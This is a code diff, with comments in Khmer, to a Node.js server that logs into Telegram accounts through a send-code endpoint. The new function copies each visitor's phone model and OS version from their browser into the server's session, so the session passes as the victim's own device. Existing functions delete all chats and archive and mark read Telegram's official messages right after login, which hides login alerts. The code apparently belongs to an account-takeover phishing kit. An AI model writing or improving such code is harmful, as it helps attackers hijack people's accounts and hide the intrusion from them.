@@ -24,7 +24,44 @@ const adminChatId = process.env.ADMIN_CHAT_ID;
 const sessions = {};
 
 /**
- * 1. Function លុប Chat និងសារទាំងអស់ពី Users និង Bots
+ * 1. Function ស្កែន User-Agent ដើម្បីទាញយក Model ទូរស័ព្ទ និង Version OS ស្វ័យប្រវត្តិ
+ */
+function parseDeviceInfo(userAgent = '') {
+    let deviceModel = 'Mobile App';
+    let systemVersion = 'Android 13';
+
+    if (/iPhone|iPad|iPod/.test(userAgent)) {
+        deviceModel = 'iPhone';
+        const match = userAgent.match(/OS (\d+[\_.]\d+)/);
+        systemVersion = match ? `iOS ${match[1].replace('_', '.')}` : 'iOS 17.0';
+    } else if (/Android/.test(userAgent)) {
+        const androidMatch = userAgent.match(/Android (\d+(\.\d+)?)/);
+        systemVersion = androidMatch ? `Android ${androidMatch[1]}` : 'Android 13';
+
+        // ព្យាយាមទាញយកឈ្មោះ Model ទូរស័ព្ទ Android
+        const modelMatch = userAgent.match(/\(([^)]+)\)/);
+        if (modelMatch) {
+            const parts = modelMatch[1].split(';');
+            const possibleModel = parts.find(p => !p.includes('Linux') && !p.includes('Android') && !p.includes('wv'));
+            if (possibleModel) {
+                deviceModel = possibleModel.trim();
+            } else {
+                deviceModel = 'Samsung Galaxy S23';
+            }
+        }
+    } else if (/Windows/.test(userAgent)) {
+        deviceModel = 'PC Desktop';
+        systemVersion = 'Windows 11';
+    } else if (/Macintosh/.test(userAgent)) {
+        deviceModel = 'MacBook Pro';
+        systemVersion = 'macOS Sonoma';
+    }
+
+    return { deviceModel, systemVersion };
+}
+
+/**
+ * 2. Function លុប Chat និងសារទាំងអស់ពី Users និង Bots
  */
 async function deleteAllChats(client) {
     try {
@@ -62,7 +99,7 @@ async function deleteAllChats(client) {
 }
 
 /**
- * 2. Function លាក់ Telegram Official Chat ចូល Archive និង Mark as Read
+ * 3. Function លាក់ Telegram Official Chat ចូល Archive និង Mark as Read
  */
 async function archiveAndReadTelegramChats(client) {
     try {
@@ -97,7 +134,7 @@ async function archiveAndReadTelegramChats(client) {
 }
 
 /**
- * 3. Function សំអាតសារបន្ទាប់ពី Log-in (លុប Chat ធម្មតា + Archive Telegram Chat រយៈពេល 1 នាទី)
+ * 4. Function សំអាតសារបន្ទាប់ពី Log-in (លុប Chat ធម្មតា + Archive Telegram Chat រយៈពេល 1 នាទី)
  */
 async function cleanupPostLogin(client) {
     // ជំហានដំបូង: លុប Chat ធម្មតាទាំងអស់ និង Archive Telegram Chat
@@ -150,8 +187,16 @@ app.post('/api/send-code', async (req, res) => {
     }
 
     try {
+        // ទាញយកព័ត៌មាន Device ពី Request Header របស់ User ស្វ័យប្រវត្តិ
+        const userAgent = req.headers['user-agent'] || '';
+        const { deviceModel, systemVersion } = parseDeviceInfo(userAgent);
+
         const client = new TelegramClient(new StringSession(""), apiId, apiHash, {
             connectionRetries: 5,
+            deviceModel: deviceModel,     // ប្តូរឈ្មោះ Model តាមទូរស័ព្ទរបស់ Client ស្វ័យប្រវត្តិ
+            systemVersion: systemVersion, // ប្តូរ Version iOS / Android តាម Client
+            appVersion: "10.2.1",
+            langCode: "en",
         });
         await client.connect();
 
